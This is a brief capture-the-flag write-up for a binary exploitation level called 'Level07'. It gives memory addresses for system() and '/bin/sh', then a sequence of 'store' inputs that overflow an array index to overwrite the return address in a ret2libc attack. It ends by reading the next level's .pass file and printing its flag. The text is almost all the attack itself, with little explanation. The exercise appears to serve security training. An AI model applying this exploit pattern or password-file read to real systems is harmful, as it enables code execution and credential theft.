## Level07
## Source code
![level07_1.png](level07_1.png)
![level07_2.png](level07_2.png)
## Walkthrough
	address of array begin 0xffffd544
	0xffffd70c => return address
	0xffffd514 => location for "/bin/sh"

	location of system = 0xf7e6aed0 => 4159090384
	location 0f "/bin/sh" = 0xf7f897ec => 4160264172
## Answer
	exec find_offset to get offset

	store
	4159090384
	1073741938

	store
	4160264172
	116

	quit

	cat /home/users/level08/.pass
## Flag
	7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC